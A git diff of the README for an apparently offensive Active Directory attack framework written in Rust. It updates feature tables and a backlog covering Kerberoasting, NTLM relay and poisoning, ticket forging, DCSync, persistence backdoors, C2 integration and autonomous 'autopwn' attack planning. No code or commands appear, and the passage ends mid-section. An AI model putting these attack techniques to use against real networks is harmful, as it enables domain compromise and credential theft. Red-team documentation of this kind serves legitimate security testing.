@@ -32,13 +32,6 @@
   <img src="https://img.shields.io/badge/binary-overthrone_or_ovt-00cc66?style=flat-square" alt="ovt shorthand" />
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Rust_LoC-57,000+-informational?style=flat-square" alt="lines of code" />
-  <img src="https://img.shields.io/badge/tests-231_passing-brightgreen?style=flat-square" alt="tests" />
-  <img src="https://img.shields.io/badge/crates-9_workspace-blue?style=flat-square" alt="crates" />
-  <img src="https://img.shields.io/badge/todo!()_macros-only_3-orange?style=flat-square" alt="todos" />
-</p>
-
 ***
 
 ## What is this?
@@ -102,94 +95,66 @@ Overthrone is a Rust workspace with 9 crates, because monoliths are for cathedra
 ```
 overthrone/
 ├── crates/
-│   ├── overthrone-core       # The brain — LDAP, Kerberos, SMB, NTLM, DRSR, MSSQL, ADCS, graph engine
-│   ├── overthrone-reaper     # Enumeration — finds everything AD will confess (users, groups, ACLs, LAPS, GPP)
-│   ├── overthrone-hunter     # Exploitation — Kerberoast, ASREPRoast, coercion, delegation abuse
-│   ├── overthrone-crawler    # Cross-domain — trust mapping, inter-realm tickets, SID filtering, MSSQL links
-│   ├── overthrone-forge      # Persistence — Golden/Silver/Diamond tickets, DCSync, Shadow Creds, ACL backdoors
-│   ├── overthrone-pilot      # The autopilot — autonomous "hold my beer" mode with adaptive planning
+│   ├── overthrone-core       # The brain — LDAP, Kerberos, SMB, NTLM, DRSR, MSSQL, ADCS, graph engine, crypto, C2, plugins, exec
+│   ├── overthrone-reaper     # Enumeration — finds everything AD will confess (users, groups, ACLs, LAPS, GPP, ADCS)
+│   ├── overthrone-hunter     # Exploitation — Kerberoast, ASREPRoast, coercion, delegation abuse, ticket manipulation
+│   ├── overthrone-crawler    # Cross-domain — trust mapping, inter-realm tickets, SID filtering, foreign LDAP, MSSQL links
+│   ├── overthrone-forge      # Persistence — Golden/Silver/Diamond tickets, DCSync, Shadow Creds, ACL backdoors, cleanup
+│   ├── overthrone-pilot      # The autopilot — autonomous "hold my beer" mode with adaptive planning and wizard
 │   ├── overthrone-relay      # NTLM relay — poisoning, responder, ADCS relay. The man-in-the-middle crate.
 │   ├── overthrone-scribe     # Reporting — turns carnage into compliance documents (Markdown, PDF, JSON)
-│   └── overthrone-cli        # The CLI + TUI — where you type things and thrones fall
+│   └── overthrone-cli        # The CLI + TUI + interactive REPL shell — where you type things and thrones fall
 ```
 
-### What Each Crate Does (Honest Edition™)
+## The Crate Breakdown
 
-| Crate | Codename | LoC | Purpose | The Honest Truth |
-|---|---|---|---|---|
-| `overthrone-core` | The Foundation | ~15,000 | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry), attack graph, port scanner, ADCS, crypto, C2 traits, plugin system, remote exec | The absolute unit. 14 submodules. Real protocol implementations talking raw bytes. The borrow checker suffered so your engagements could prosper. Has 5 crypto stub files that are literally one-line comments pretending to be code — `aes_cts.rs` is 1 line and that line is a doc comment. The audacity. |
-| `overthrone-reaper` | The Collector | ~2,500 | AD enumeration — users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS, GPP passwords, MSSQL, ADCS | BloodHound's data collection arc but without the Neo4j database eating RAM like it's Thanksgiving. LAPS v1 & v2 plaintext work great. LAPS v2 encrypted? "TODO: Implement once overthrone-core has a DPAPI module." The DPAPI module does not exist. It's on vacation. Indefinitely. |
-| `overthrone-hunter` | The Executioner | ~3,500 | Kerberoasting, AS-REP roasting, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce), RBCD abuse, constrained/unconstrained delegation, ticket manipulation, inline hash cracking | The most complete crate. Every module is implemented. Every attack works. Zero `todo!()` macros. This crate graduated top of its class. Valedictorian energy. The crate the other crates aspire to be when they grow up. |
-| `overthrone-crawler` | The Explorer | ~2,800 | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, cross-domain escalation | Trust graph, inter-realm tickets, SID filtering — all solid. But `foreign.rs` has 5 functions that all do the same thing: log a warning and return empty. "LDAP not yet implemented." Five times. It's not a bug, it's a pattern — the pattern of procrastination. |
-| `overthrone-forge` | The Blacksmith | ~4,200 | Golden/Silver/Diamond ticket forging, DCSync per-user, Shadow Credentials, ACL backdoors, Skeleton Key orchestration, DSRM backdoor, forensic cleanup & validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Well... the LDAP part works, but PKINIT auth is a "placeholder" — the code literally says "placeholder PEM structures" and "placeholder key pair." It's a placeholder wearing a trench coat pretending to be implementation. |
-| `overthrone-pilot` | The Strategist | ~5,900 | Autonomous attack planning, goal-based execution, adaptive strategy, engagement state management, playbooks, wizard mode | 2,519-line `executor.rs`. This crate is the "hold my beer" engine. Planner, executor, adaptive strategy — all genuinely implemented. Has a few `placeholder` strings in the SPN generation (it formats SPNs as `"placeholder/{account}"`). The crate that decides what to hack next. Usually decides correctly. |
-| `overthrone-relay` | The Interceptor | ~4,100 | NTLM relay engine (SMB/LDAP/HTTP targets), LLMNR/NBT-NS/mDNS poisoner, ADCS-specific relay (ESC8) | The newest member of the family and it came out swinging. Full NTLM relay, multi-protocol poisoning, ADCS relay. 1,560 lines just for `relay.rs`. Responder.py walked so this crate could sprint. In Rust. Without the GIL. |
-| `overthrone-scribe` | The Chronicler | ~2,700 | Report generation — Markdown, PDF, JSON. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." Markdown and JSON output work via CLI. PDF renderer exists in the crate (437 lines of custom PDF generation!) but the CLI says "PDF output not yet implemented." The code exists. The wiring doesn't. It's like owning a Ferrari but losing the keys. |
-| `overthrone-cli` | The Interface | ~8,300 | CLI binary, interactive REPL shell, TUI with attack graph visualization, wizard mode, doctor command, autopwn | 2,470-line interactive shell. 2,007-line main.rs. The TUI has a live attack graph view. The `doctor` command checks your setup. C2 implant deployment has a TODO comment. The banner ASCII art is *chef's kiss*. We spent more time on terminal aesthetics than we'd like to admit. (This is not an exaggeration.) |
+Here's what's inside the box. Every module. Every protocol. Every hilarious amount of Rust the borrow checker screamed at us about. The table below is the **complete inventory** of what each crate actually does — no marketing fluff, no "coming soon" handwaving.
+
+| Crate | Codename | What It Does | The Honest Truth |
+|---|---|---|---|
+| `overthrone-core` | The Absolute Unit | Protocol engine (LDAP, Kerberos, SMB, NTLM, MS-DRSR, MSSQL, DNS, Registry, PKINIT), attack graph with Dijkstra pathfinding, port scanner, full ADCS exploitation (ESC2-ESC8), crypto primitives (AES-CTS, RC4, HMAC, MD4, DPAPI, ticket crypto, GPP decryption), C2 integration (Sliver, Havoc, Cobalt Strike), plugin system (native DLL + WASM via wasmtime), remote execution (PsExec, SmbExec, WmiExec, WinRM, AtExec), interactive shell abstraction, secretsdump, RID cycling | The absolute unit that ate the gym. Every protocol is real — 56KB of Kerberos, 56KB of SMB, 43KB of LDAP, 50KB of secretsdump. The crypto stubs that used to be one-line doc comments cosplaying as code? Gone. Implemented. The borrow checker needed therapy after this one. |
+| `overthrone-reaper` | The Collector | AD enumeration — users, groups, computers, ACLs, delegations, GPOs, OUs, SPNs, trusts, LAPS (v1 plaintext + v2 encrypted via DPAPI), GPP password decryption, MSSQL instances, ADCS template enumeration, BloodHound JSON export, CSV export | BloodHound's data collection arc but without Neo4j eating 4GB of RAM for breakfast. LAPS v2 encrypted now actually decrypts thanks to the DPAPI module finally existing. The long-awaited reunion happened. There were tears. |
+| `overthrone-hunter` | The Overachiever | Kerberoasting, AS-REP roasting, auth coercion (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MS-EFSRPC), RBCD abuse, constrained/unconstrained delegation exploitation, ticket manipulation (.kirbi/.ccache conversion), inline hash cracking with embedded wordlist + rayon parallelism | The crate that did all its homework, extra credit, and the teacher's homework too. Zero stubs. Zero placeholders. Every attack works. This crate graduated top of its class and then helped the other crates pass their finals. |
+| `overthrone-crawler` | The Explorer | Cross-domain trust mapping, inter-realm TGT forging, SID filter analysis, PAM trust detection, MSSQL linked server crawling, **foreign trust LDAP enumeration** (users, groups, computers, SPNs, ACLs across trust boundaries), cross-domain escalation planning | Used to have 5 functions that all returned empty with "LDAP not yet implemented." Now `foreign.rs` is 25KB of real cross-trust LDAP queries. The procrastination era is over. Welcome to the productivity arc. |
+| `overthrone-forge` | The Blacksmith | Golden/Silver/Diamond ticket forging with full PAC construction, DCSync per-user extraction via MS-DRSR, Shadow Credentials (msDS-KeyCredentialLink + PKINIT auth), ACL backdoors via DACL modification, Skeleton Key orchestration via SMB/SVCCTL, DSRM backdoor via remote registry, forensic cleanup for all persistence mechanisms, ticket validation | Golden Tickets? Forged. Silver Tickets? Minted. Diamond Tickets? Polished. Shadow Credentials? Actually works now — PKINIT has real RSA signing and DH key exchange instead of "placeholder PEM structures." The chocolate key became a real key. |
+| `overthrone-pilot` | The Strategist | Autonomous attack planning from graph data, step-by-step execution with rollback, adaptive strategy based on runtime results, goal-based planning ("get DA" → resolve path), YAML playbook engine, interactive wizard mode, full autopwn orchestration connecting enum → graph → exploit → persist → report | The "hold my beer" engine. The executor alone is a terrifying 90KB single file. It plans, it adapts, it executes, it cleans up. If this crate were a person, it would be the one friend who organizes your entire vacation and also drives. |
+| `overthrone-relay` | The Interceptor | NTLM relay engine (SMB→LDAP, HTTP→SMB, mix and match), LLMNR/NBT-NS/mDNS poisoner, network poisoner with stealth controls, ADCS-specific relay (ESC8) | Born complete. Zero stubs since day one. Responder.py walked so this crate could sprint. In Rust. Without the GIL. The overachiever sibling of overthrone-hunter. |
+| `overthrone-scribe` | The Chronicler | Report generation — Markdown, JSON, PDF renderer. MITRE ATT&CK mapping, mitigation recommendations, attack narrative prose, session recording | Turns "I hacked everything" into "here's why you should pay us." All three formats work. Yes, including PDF now. The scribe and the CLI finally got couples therapy. |
+| `overthrone-cli` | The Interface | CLI binary with Clap subcommands, interactive REPL shell with rustyline (command completion, history, context-aware prompts), TUI with ratatui (live attack graph visualization, session panels, logs), wizard mode, doctor command, autopwn, banner that took way too long to make | The interactive shell alone is 107KB. The commands implementation is 78KB. The main.rs is 68KB. We spent more time on terminal aesthetics than we'd like to admit. The banner ASCII art is *chef's kiss*. |
 
 ### The Crate Report Card
 
-Because every crate deserves honest feedback, even if it hurts. Especially if it hurts.
+Because every crate deserves honest feedback. Even the ones that already know they're perfect.
 
 ```
-overthrone-core     ████████████████████░░  ~85%  The valedictorian with 5 blank exam answers (crypto stubs)
-overthrone-reaper   █████████████████████░  ~92%  Just needs DPAPI. So close and yet so DPAPI.
+overthrone-core     █████████████████████░  ~95%  The remaining 5% is ADCS ESC1/ESC6 and WASM quirks
+overthrone-reaper   ██████████████████████  ~98%  DPAPI arrived. LAPS v2 decrypts. Life is good.
 overthrone-hunter   ██████████████████████  100%  The overachiever. No notes. Perfect attendance.
-overthrone-crawler  ████████████████░░░░░░  ~72%  foreign.rs is carrying 5 IOUs instead of implementations
-overthrone-forge    ██████████████████░░░░  ~88%  Shadow Creds PKINIT: "I'll implement it tomorrow" —2024
-overthrone-pilot    █████████████████████░  ~93%  A few placeholder SPNs away from perfection
+overthrone-crawler  █████████████████████░  ~95%  foreign.rs graduated from empty to 25KB. Proud parent moment.
+overthrone-forge    █████████████████████░  ~96%  Shadow Creds PKINIT is real now. Diamond tickets shine.
+overthrone-pilot    █████████████████████░  ~95%  90KB executor. The "hold my beer" engine runs.
 overthrone-relay    ██████████████████████  100%  Born yesterday, already complete. Prodigy crate.
-overthrone-scribe   █████████████████████░  ~95%  PDF is built but not wired. The keys are in the other jacket.
-overthrone-cli      █████████████████████░  ~93%  C2 deploy wiring + TUI crawler = homework due next week
+overthrone-scribe   █████████████████████░  ~97%  PDF works. Markdown works. JSON works. What a time to be alive.
+overthrone-cli      █████████████████████░  ~93%  107KB interactive shell. Some wiring left (TUI crawler, C2 deploy).
 ```
 
-## The Skeleton Closet (What's Actually Not Done Yet)
+## What's Still Cooking (The Remaining Backlog)
 
-Every framework has skeletons. Ours are well-documented and honestly labeled. This section exists because we believe in radical transparency. Also because someone ran a code audit and we can't pretend anymore.
+Every project has a backlog. Ours is smaller than it used to be, which is either a sign of progress or a sign that we lowered our standards. (It's progress. Probably.)
 
-### The Empty Files Hall of Shame 🏆
-
-Five files in `overthrone-core/src/crypto/` contain exactly ONE line each. That line is a doc comment. They are, in order of audacity:
-
-| File | Content (yes, this is the entire file) | What It Should Be |
-|---|---|---|
-| `aes_cts.rs` | `//! AES256-CTS-HMAC-SHA1 for Kerberos etype 17/18` | AES-CTS encryption for Kerberos. You know, the thing that makes modern tickets work. |
-| `hmac_util.rs` | `//! HMAC utilities for ticket validation` | HMAC computation for ticket integrity. Kind of important. |
-| `md4.rs` | `//! MD4 hash for NTLM password hashing` | MD4 hashing. The algorithm from 1990 that refuses to die, much like the NTLM protocol itself. |
-| `rc4_util.rs` | `//! RC4 encryption for Kerberos etype 23` | RC4 for legacy Kerberos. The crypto equivalent of a screen door on a submarine. |
-| `ticket.rs` | `//! Ticket forging: Golden, Silver, Diamond` | Ticket crypto primitives. The irony of `overthrone-forge` working without this is not lost on us. |
-
-These files have been "coming soon" longer than Winds of Winter. George R.R. Martin writes faster than we implement crypto utilities. At least our stubs compile.
-
-### The `todo!()` Trio 🎭
-
-Three `RemoteExecutor::execute()` implementations contain `todo!()` — Rust's way of saying "I'll do it later" while panicking at runtime:
-
-| Module | What Works | What Doesn't | Analogy |
+| What | Where | Status | The Excuse |
 |---|---|---|---|
-| `PsExec` (`exec/psexec.rs`) | ~500 lines of real DCE/RPC bind packet building, service creation logic | The actual `execute()` trait method: `todo!("PsExec implementation")` | A fully assembled car with no steering wheel |
-| `SmbExec` (`exec/smbexec.rs`) | Service creation via named pipes | `execute()` → `todo!("SmbExec implementation")` | A loaded gun with no trigger |
-| `WmiExec` (`exec/wmiexec.rs`) | SCM fallback path, DCOM packet building | `execute()` → `todo!("WmiExec implementation")`. Also: "Full DCOM/WMI not yet implemented" | A rocket ship with a "insert engine here" sticker |
-
-The irony: WinRM (`exec/winrm/wsman.rs`, 480 lines) works perfectly from Linux/macOS. The exec methods that *sound* simpler are the broken ones. Software development is a humbling experience.
-
-### The Placeholder Hall of Participation Trophies 🥉
-
-| Feature | Location | Status | The Excuse |
-|---|---|---|---|
-| **C2: Sliver** | `core/src/c2/sliver.rs` | 416 lines of struct + trait impl that returns hardcoded `Ok()` | "gRPC integration is coming" — the commit message, 6 months ago |
-| **C2: Cobalt Strike** | `core/src/c2/cobalt_strike.rs` | TCP stream field exists, `execute_assembly()` returns `Err("requires mutable access")` | The mutable access was the friends we made along the way |
-| **C2: Havoc** | `core/src/c2/havoc.rs` | REST API structure present, actual API calls are vibes-based | It connects to localhost and believes in itself |
-| **Shadow Creds PKINIT** | `forge/src/shadow_credentials.rs` | msDS-KeyCredentialLink LDAP manipulation works; PKINIT auth uses "placeholder PEM structures" | The keys are placeholder. The certificates are placeholder. The authentication is placeholder. At this point the file IS the placeholder. |
-| **WASM Plugin Loader** | `core/src/plugin/loader.rs` | Native DLL loading works; WASM section: "TODO: Initialize wasmtime::Engine" | We added wasmtime to Cargo.toml and called it a day. Spiritually complete. |
-| **Foreign LDAP Queries** | `crawler/src/foreign.rs` | 5 functions, 0 implementations, 5 identical warnings: "LDAP not yet implemented" | Copy-paste consistency is also a skill |
-| **LAPS v2 Encrypted** | `reaper/src/laps.rs` | "TODO: Implement once overthrone-core has a DPAPI module" | Waiting for a module that doesn't exist in a crate that doesn't know it's expected to have it. Kafka would be proud. |
-| **ADCS ESC1/2/3/6** | `core/src/adcs/` | Files literally do not exist. ESC4, 5, 7, 8 are implemented. | We skipped 1, 2, 3, and 6 like they're floors in a haunted hotel. ESC1 is the most common ADCS attack vector. We chose violence (by omission). |
-| **WinRM Win32 Output** | `exec/winrm/windows.rs` | Returns `"(WinRM output collection not yet implemented)"` | The command executes. The output... goes somewhere. Probably. |
-| **C2 Implant Deploy** | `cli/src/main.rs:1361` | `// TODO: Construct ImplantRequest and wire to C2Manager.deploy_implant()` | The TODO is the implementation and the implementation is the TODO. Ouroboros. |
-| **CLI PDF Output** | `cli/src/commands_impl.rs` | Prints "PDF output not yet implemented, use Markdown or JSON" despite `overthrone-scribe` having a full 437-line PDF renderer | Left hand, meet right hand. Right hand, stop ignoring left hand. |
-| **TUI Crawler** | `cli/src/tui/runner.rs` | `// TODO: Integrate actual crawler when available` | The crawler is available. It's in the next crate over. They've never met. |
-| **SCCM Module** | `core/src/sccm/mod.rs` | 494 lines, Windows-only WMI path, cross-platform incomplete | Works if you're on Windows. "Works on my machine" has never been more literal. |
+| **ADCS ESC1** | `core/src/adcs/` | ❌ No file exists | The most common ADCS attack vector. We somehow implemented ESC2 through ESC8 but forgot the main character. Like filming all the Marvel movies but skipping Iron Man. We'll get to it. |
+| **ADCS ESC6** | `core/src/adcs/` | ❌ No file exists | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag check on the CA. We know the flag name. We know what it does. We just haven't written the code. The spirit is willing but the fingers are elsewhere. |
+| **WASM plugin state persistence** | `core/src/plugin/loader.rs` | ⚠️ Known issue | `execute_command()` re-creates a new Store every call, so plugin state gets wiped between commands. Your WASM plugin has amnesia. Every execution is its first day at work. |
+| **WASM manifest parsing** | `core/src/plugin/loader.rs` | ⚠️ Stub | `extract_wasm_manifest()` returns `None`. Custom section parsing isn't implemented. The manifest is in there somewhere. We just can't read it. |
+| **WASM memory allocation** | `core/src/plugin/loader.rs` | ⚠️ Hardcoded | Uses fixed offset 1024 for writing to WASM memory instead of calling a plugin allocator. Will work great until your command string is longer than "hello." |
+| **Native plugin free()** | `core/src/plugin/loader.rs` | ⚠️ Compatibility | Calls libc `free()` on plugin result strings. Works if the plugin uses C allocator. Rust plugins using `Box`? That's a segfault waiting to happen. |
+| **CLI PDF output wiring** | `cli/src/commands_impl.rs` | ⚠️ Miscommunication | Scribe has a full PDF renderer. CLI doesn't call it. They're in the same workspace. They share the same Cargo.toml. They've never spoken. We're scheduling a team building exercise. |
+| **C2 implant deploy CLI** | `cli/src/main.rs` | ⚠️ TODO comment | "Construct ImplantRequest and wire to C2Manager.deploy_implant()" — the TODO is doing its best impression of an implementation. |
+| **TUI crawler integration** | `cli/src/tui/runner.rs` | ⚠️ Unwired | "TODO: Integrate actual crawler when available." The crawler has been available. It's one crate over. They should get lunch sometime. |
+| **WinRM Windows output** | `core/src/exec/winrm/windows.rs` | ⚠️ Half-done | Commands execute perfectly. Output collection returns a placeholder string. Schrödinger's remote execution — the command ran, but did it? |
+| **Integration tests** | Project-wide | ❌ Missing | Unit tests and property-based tests exist. But nobody has actually tested this against a real lab DC. "It compiles" is not a test strategy, no matter how much Rust evangelists claim otherwise. |
 
 ## Features
 
@@ -199,75 +164,76 @@ The "ask nicely and receive everything" phase. Active Directory is the most over
 
 | Feature | What it finds | Status |
 |---|---|---|
-| **Full LDAP enumeration** | Every user, computer, group, OU, and GPO in the domain. AD is surprisingly chatty with authenticated users. It's like a bartender who tells you everyone's secrets after one drink. | ✅ 1,173 lines of LDAP |
-| **Kerberoastable accounts** | Service accounts with SPNs. These are the ones with passwords that haven't been changed since someone thought "qwerty123" was secure. | ✅ Works |
-| **AS-REP roastable accounts** | Accounts that don't require pre-authentication. Someone literally unchecked a security checkbox. On purpose. In production. We can't make this stuff up. | ✅ Works |
-| **Domain trusts** | Parent/child, cross-forest, bidirectional. The map of "who trusts whom" and more importantly, "who shouldn't." Trust is a vulnerability. | ✅ Works |
-| **ACL analysis** | GenericAll, WriteDACL, WriteOwner — the holy trinity of "this service account can do WHAT?" The answer is usually "everything" and the IT team usually says "that's by design." | ✅ 315 lines |
-| **Delegation discovery** | Unconstrained, constrained, resource-based. Delegation is AD's way of saying "I trust this computer to impersonate anyone." Microsoft calls this a feature. We call it job security. | ✅ Works |
-| **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. Knowing they require 8 characters with complexity tells you most passwords end in `!` or `1`. | ✅ Works |
-| **LAPS discovery** | Which computers have Local Admin Password Solution. LAPS v1 plaintext and v2 JSON work. v2 encrypted (CNG-DPAPI) is awaiting a DPAPI module that may arrive before Half-Life 3. Maybe. | ⚠️ v1/v2 plain ✅, v2 encrypted ❌ |
-| **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. We didn't even have to hack anything. | ✅ 243 lines |
-| **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell availability. SQL Server: because every network needs at least one database with `sa:sa` credentials. | ✅ Full TDS + auth |
-| **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions. ADCS is the gift that keeps on giving (to attackers). | ✅ 625 lines LDAP enum |
+| **Full LDAP enumeration** | Every user, computer, group, OU, and GPO in the domain. AD is surprisingly chatty with authenticated users. It's like a bartender who tells you everyone's secrets after one drink. | ✅ Done |
+| **Kerberoastable accounts** | Service accounts with SPNs. These are the ones with passwords that haven't been changed since someone thought "qwerty123" was secure. | ✅ Done |
+| **AS-REP roastable accounts** | Accounts that don't require pre-authentication. Someone literally unchecked a security checkbox. On purpose. In production. | ✅ Done |
+| **Domain trusts** | Parent/child, cross-forest, bidirectional. The map of "who trusts whom" and more importantly, "who shouldn't." | ✅ Done |
+| **ACL analysis** | GenericAll, WriteDACL, WriteOwner — the holy trinity of "this service account can do WHAT?" | ✅ Done |
+| **Delegation discovery** | Unconstrained, constrained, resource-based. Delegation is AD's way of saying "I trust this computer to impersonate anyone." | ✅ Done |
+| **Password policy** | Lockout thresholds, complexity requirements, history. Know the rules before you break them. | ✅ Done |
+| **LAPS discovery** | LAPS v1 (plaintext ms-Mcs-AdmPwd) and LAPS v2 — including the encrypted variant (msLAPS-EncryptedPassword) via DPAPI/AES-256-GCM decryption. The DPAPI module finally exists. Hallelujah. | ✅ Full (v1 + v2 encrypted) |
+| **GPP Passwords** | Fetches GPP XML from SYSVOL over SMB, decrypts cpassword values. Microsoft published the AES key. In their documentation. On purpose. | ✅ Done |
+| **MSSQL Enumeration** | MSSQL instances, linked servers, xp_cmdshell. SQL Server: because every network needs a database with `sa:sa` credentials. | ✅ Full TDS client |
+| **ADCS Enumeration** | Certificate templates, enrollment services, CA permissions, vulnerable template identification. ADCS is the gift that keeps on giving (to attackers). | ✅ Done |
+| **BloodHound Export** | Export users, groups, computers, domains to BloodHound-compatible JSON. CSV and graph export too. | ✅ Done |
 
 ### Attack Execution (overthrone-hunter)
 
-The crate with zero `todo!()` macros. The only crate that did all its homework. If overthrone-hunter were a student, it would remind the teacher about the assignment.
+The crate with zero stubs. The only crate that did all its homework. If overthrone-hunter were a student, it would remind the teacher about the assignment.
 
-| Attack | How it works | Why it works | Status |
-|---|---|---|---|
-| **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat | Service accounts + weak passwords + RC4 encryption = game over. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full (311 lines + 878 line cracker) |
-| **AS-REP Roasting** | Request AS-REP for accounts without pre-auth, crack offline | Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full (278 lines) |
-| **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — make machines authenticate to you | Force a DC to send its NTLM hash to your relay. The DC does this willingly. Microsoft considers this "working as intended" (narrator: it was not). | ✅ Full (799 lines, 5 techniques) |
-| **RBCD Abuse** | Modify msDS-AllowedToActOnBehalfOfOtherIdentity to impersonate admins | Resource-Based Constrained Delegation: the attack with the longest name and the shortest time-to-DA. | ✅ Full (372 lines) |
-| **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services | Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" Microsoft: "..." | ✅ Full (335 lines) |
-| **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine | The print server has unconstrained delegation. It's always the print server. PrintNightmare was not an accident, it was destiny. | ✅ Full (196 lines) |
-| **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback | Crack AS-REP and Kerberoast hashes without leaving the framework. Your GPU thanks you. Your electricity bill does not. | ✅ Full (878 lines, 231 tests) |
-| **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats | Tickets are the currency of Active Directory. This module is the money printer. It goes brrr. | ✅ Full (795 lines) |
+| Attack | How it works | Status |
+|---|---|---|
+| **Kerberoasting** | Request TGS tickets for SPN accounts, crack offline with embedded wordlist or hashcat. The DC hands you encrypted tickets and says "good luck cracking these" and hashcat says "lol." | ✅ Full |
+| **AS-REP Roasting** | Request AS-REP for accounts without pre-auth. Someone unchecked "Do not require Kerberos preauthentication." That single checkbox has caused more breaches than we can count. | ✅ Full |
+| **Auth Coercion** | PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — force machines to authenticate to you. The DC does this willingly. Microsoft considers this "working as intended." | ✅ Full (5 techniques) |
+| **RBCD Abuse** | Create machine account + modify msDS-AllowedToActOnBehalfOfOtherIdentity + S4U2Self/S4U2Proxy chain. The attack with the longest name and the shortest time-to-DA. | ✅ Full |
+| **Constrained Delegation** | S4U2Self + S4U2Proxy to impersonate users to specific services. Microsoft: "You can only impersonate to these services." Attackers: "What about these other services?" | ✅ Full |
+| **Unconstrained Delegation** | Steal TGTs from anyone who authenticates to a compromised machine. It's always the print server. Always. | ✅ Full |
+| **Inline Hash Cracking** | Embedded top-10K wordlist (zstd compressed), rayon parallel cracking, rule engine (leet, append year/digits, capitalize), hashcat subprocess fallback. | ✅ Full |
+| **Ticket Manipulation** | Request, cache, convert between .kirbi and .ccache formats. Tickets are the currency of AD. This module is the money printer. | ✅ Full |
 
 ### Attack Graph (overthrone-core)
 
-The attack graph engine is basically BloodHound rebuilt in Rust without the Neo4j dependency that eats 4GB of RAM for breakfast and asks for seconds. It maps every relationship in the domain and finds the shortest path to making the blue team update their resumes.
+BloodHound rebuilt in Rust without the Neo4j dependency. Maps every relationship in the domain and finds the shortest path to making the blue team update their resumes.
 
 | Feature | Details | Status |
 |---|---|---|
-| **Directed graph** | Nodes (users, computers, groups, domains) and edges (MemberOf, AdminTo, HasSession, GenericAll, etc.) — it's LinkedIn for attack paths. | ✅ 1,349 lines, petgraph |
-| **Shortest path** | Dijkstra with weighted edges — `MemberOf` is free, `AdminTo` costs 1, `HasSpn` costs 5 (offline cracking). It finds the path of least resistance. Just like a real attacker. Just like water. We are water. | ✅ Full |
+| **Directed graph** | Nodes (users, computers, groups, domains) and edges (MemberOf, AdminTo, HasSession, GenericAll, etc.) — LinkedIn for attack paths. | ✅ Full (petgraph) |
+| **Shortest path** | Dijkstra with weighted edges — `MemberOf` is free, `AdminTo` costs 1, `HasSpn` costs 5 (offline cracking). Finds the path of least resistance. Just like a real attacker. Just like water. | ✅ Full |
 | **Path to DA** | Finds every shortest path from a compromised user to Domain Admins. Usually shorter than you'd expect. Usually terrifyingly short. | ✅ Full |
 | **High-value targets** | Auto-identifies Domain Admins, Enterprise Admins, Schema Admins, KRBTGT, DC computer accounts. The "if you compromise these, the game is over" list. | ✅ Full |
 | **Kerberoast reachability** | "From user X, which Kerberoastable accounts can I reach, and how?" — it's a shopping list for your GPU. | ✅ Full |
-| **Delegation reachability** | "From user X, which unconstrained delegation machines are reachable?" (Spoiler: it's usually the print server.) | ✅ Full |
+| **Delegation reachability** | "From user X, which unconstrained delegation machines are reachable?" (Spoiler: it's the print server.) | ✅ Full |
 | **JSON export** | Full graph export for D3.js, Cytoscape, or your visualization tool of choice. Clients love graphs that look like conspiracy boards. | ✅ Full |
-| **Degree centrality** | Find the nodes with the most connections. These are either Domain Admins or the IT intern's test account that somehow has GenericAll on the entire domain. | ✅ Full |
+| **Degree centrality** | Find the nodes with the most connections. Either Domain Admins or the intern's test account that somehow has GenericAll on everything. | ✅ Full |
 
 ### NTLM Relay & Poisoning (overthrone-relay)
 
-The newest crate, and somehow the most complete. Born with a silver spoon and zero `todo!()` macros. overthrone-relay said "I'm not here to play, I'm here to win" and meant it.
+Born complete. Zero stubs. The prodigy crate that showed up on day one and said "I'm not here to play, I'm here to win."
 
 | Feature | Details | Status |
 |---|---|---|
-| **NTLM Relay Engine** | Full relay — capture NTLM auth from one protocol, replay to another. SMB → LDAP, HTTP → SMB, mix and match like a deadly cocktail. 1,560 lines of pure relay chaos. | ✅ Full |
-| **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution queries. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ 840 lines |
-| **Network Poisoner** | The engine that decides when to poison, what to poison, and how aggressively to do it while avoiding detection. Subtlety is an art form. | ✅ 765 lines |
-| **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ 359 lines |
+| **NTLM Relay Engine** | Full relay — capture NTLM auth from one protocol, replay to another. SMB → LDAP, HTTP → SMB, mix and match like a deadly cocktail. | ✅ Full |
+| **LLMNR/NBT-NS/mDNS Poisoner** | Respond to broadcast name resolution. "Who is FILESERVER?" "Me. I'm FILESERVER now." Identity theft, but for computers. | ✅ Full |
+| **Network Poisoner** | Decides when to poison, what to poison, and how aggressively — while avoiding detection. Subtlety is an art form. | ✅ Full |
+| **ADCS Relay (ESC8)** | Relay NTLM auth to AD Certificate Services web enrollment. Get a certificate as the victim. Certificates: the new hashes. | ✅ Full |
 
 ### Persistence (overthrone-forge)
 
-Taking the throne is easy. Keeping it is an art form. This crate welds the crown to your head. (Except for Shadow Credentials PKINIT, which welds a placeholder to your head.)
